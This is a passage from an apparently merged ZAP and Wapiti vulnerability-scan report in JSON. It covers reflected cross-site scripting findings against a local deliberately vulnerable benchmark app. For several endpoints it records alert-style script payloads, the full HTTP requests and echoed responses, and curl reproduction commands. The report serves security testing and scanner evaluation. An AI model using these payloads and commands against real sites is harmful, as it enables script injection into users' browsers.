            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00492?BenchmarkTest00492=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00492.html?BenchmarkTest00492=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00492?username=alice&password=Letm3in_&BenchmarkTest00492=%3CScRiPt%3Ealert%28%27wzpb1893pg%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '43', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:04 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': 'Parameter value: <scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '53', 'date': 'Sun, 31 Aug 2025 04:21:46 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"Parameter value: <ScRiPt>alert('wzpb1893pg')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-01/BenchmarkTest00644?BenchmarkTest00644=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-01/BenchmarkTest00644?username=alice&password=Letm3in_&BenchmarkTest00644=%3CScRiPt%3Ealert%28%27wi9jwxm074%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wi9jwxm074')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wi9jwxm074')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00644?username=alice&password=Letm3in_&BenchmarkTest00644=%3CScRiPt%3Ealert%28%27wi9jwxm074%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00644.html?BenchmarkTest00644=SafeText\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00644"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00644?BenchmarkTest00644=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00644.html?BenchmarkTest00644=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00644?username=alice&password=Letm3in_&BenchmarkTest00644=%3CScRiPt%3Ealert%28%27wi9jwxm074%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:05 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:21:47 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wi9jwxm074')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-01/BenchmarkTest00719?BenchmarkTest00719=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-01/BenchmarkTest00719?username=alice&password=Letm3in_&BenchmarkTest00719=%3CScRiPt%3Ealert%28%27w700kvtz74%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w700kvtz74')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('w700kvtz74')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00719?username=alice&password=Letm3in_&BenchmarkTest00719=%3CScRiPt%3Ealert%28%27w700kvtz74%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00719.html\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00719"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00719?BenchmarkTest00719=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00719.html?BenchmarkTest00719=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00719?username=alice&password=Letm3in_&BenchmarkTest00719=%3CScRiPt%3Ealert%28%27w700kvtz74%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:05 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:21:50 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('w700kvtz74')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-01/BenchmarkTest00724?BenchmarkTest00724=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-01/BenchmarkTest00724?username=alice&password=Letm3in_&BenchmarkTest00724=%3CScRiPt%3Ealert%28%27wbmh47t1xv%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wbmh47t1xv')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wbmh47t1xv')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00724?username=alice&password=Letm3in_&BenchmarkTest00724=%3CScRiPt%3Ealert%28%27wbmh47t1xv%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00724.html?BenchmarkTest00724=SafeText\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00724"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00724?BenchmarkTest00724=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00724.html?BenchmarkTest00724=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00724?username=alice&password=Letm3in_&BenchmarkTest00724=%3CScRiPt%3Ealert%28%27wbmh47t1xv%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '27', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:05 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>\\n'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '37', 'date': 'Sun, 31 Aug 2025 04:21:50 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wbmh47t1xv')</sCrIpT>\\n\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-01/BenchmarkTest00729?BenchmarkTest00729=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-01/BenchmarkTest00729?username=alice&password=Letm3in_&BenchmarkTest00729=%3CScRiPt%3Ealert%28%27wrhfrylsg0%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wrhfrylsg0')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wrhfrylsg0')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00729?username=alice&password=Letm3in_&BenchmarkTest00729=%3CScRiPt%3Ealert%28%27wrhfrylsg0%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00729.html\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00729"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00729?BenchmarkTest00729=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00729.html?BenchmarkTest00729=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00729?username=alice&password=Letm3in_&BenchmarkTest00729=%3CScRiPt%3Ealert%28%27wrhfrylsg0%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:06 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:21:51 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wrhfrylsg0')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-01/BenchmarkTest00800?BenchmarkTest00800=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-01/BenchmarkTest00800?username=alice&password=Letm3in_&BenchmarkTest00800=%3CScRiPt%3Ealert%28%27w2vkjzatmx%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w2vkjzatmx')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('w2vkjzatmx')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00800?username=alice&password=Letm3in_&BenchmarkTest00800=%3CScRiPt%3Ealert%28%27w2vkjzatmx%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00800.html?BenchmarkTest00800=SafeText\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site 